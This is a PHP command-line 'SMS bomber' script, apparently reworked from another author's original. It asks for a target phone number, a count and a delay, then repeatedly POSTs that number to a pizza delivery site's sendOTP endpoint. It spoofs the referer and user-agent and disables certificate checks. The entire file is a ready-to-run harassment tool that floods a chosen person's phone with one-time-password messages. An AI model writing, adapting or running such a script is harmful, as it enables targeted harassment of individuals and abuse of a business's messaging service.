<?php
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}

system("clear");
echo"\n\e[93m 
   _____                 _           
  / ____|               | |          
 | (___   __ _ _ __   __| |_ __ ___  
  \___ \ / _` | '_ \ / _` | '__/ _ \ 
  ____) | (_| | | | | (_| | | | (_) |
 |_____/ \__,_|_| |_|\__,_|_|  \___/
              _         
             | |    
  _ __  _   _| |_ _ __ __ _  __ _ 
 | '_ \| | | | __| '__/ _` |/ _` |
 | |_) | |_| | |_| | | (_| | (_| |
 | .__/ \__,_|\__|_|  \__,_|\__,_|
 | |                              
 |_|                               
\e";

echo "\n\e[93m
\e[36m===========\e[91m>>>>>>>>>>\n\e[36
mBOM SMS PHD
Original Sc PHP by : Handika Pratama
Reedit By : @Sandro.putraa
\e[36m===========\e[91m>>>>>>>>>>";

echo "\n\e[93m
\e[75mCara Penggunaan\e[91m>>>>>>>>\n\e[91
minput no target (08.........)";
echo "\n\e[36mTarget  : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = phd($nomor, $jumlah, $jeda);
print $execute;
print "DONE ALL SEND\n";
?>